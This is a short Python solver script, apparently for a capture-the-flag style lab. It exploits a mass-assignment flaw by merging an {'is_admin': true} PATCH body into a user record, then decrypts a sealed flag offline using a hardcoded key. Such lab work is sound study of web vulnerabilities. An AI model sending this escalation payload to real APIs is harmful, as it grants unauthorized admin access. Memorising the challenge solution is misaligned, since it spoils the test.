#!/usr/bin/env python3
"""Craft the privileged PATCH body, replay the server logic offline, unseal.

The endpoint merges the request JSON into the user record with no allowlist. We
add is_admin=true (the field the benign capture proves is mergeable), re-run the
/api/me/flag authorization + unseal exactly as app.py does.
"""

import hashlib
import json
import os
import re

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

# The malicious PATCH /api/me body.
PAYLOAD = {"is_admin": True}


def sealed_hex() -> str:
    src = open(os.path.join(ROOT, "app.py")).read()
    parts = re.findall(r'"([0-9a-f]+)"', src)
    return "".join(p for p in parts if p and all(c in "0123456789abcdef" for c in p))


def keystream(key: bytes, n: int) -> bytes:
    out = b""
    counter = 0
    while len(out) < n:
        out += hashlib.sha256(key + counter.to_bytes(4, "big")).digest()
        counter += 1
    return out[:n]


def main() -> None:
    store = json.load(open(os.path.join(ROOT, "users.json")))
    user = next(u for u in store["users"] if u["id"] == 7)
    assert user["is_admin"] is False

    # PATCH /api/me merges the body wholesale.
    user.update(PAYLOAD)
    assert user["is_admin"] is True, "escalation failed"

    # GET /api/me/flag admin path.
    ct = bytes.fromhex(sealed_hex())
    key = hashlib.sha256(b"profile-svc-admin-seal-2026").digest()
    flag = bytes(a ^ b for a, b in zip(ct, keystream(key, len(ct)))).decode()
    print(flag)


if __name__ == "__main__":
    main()
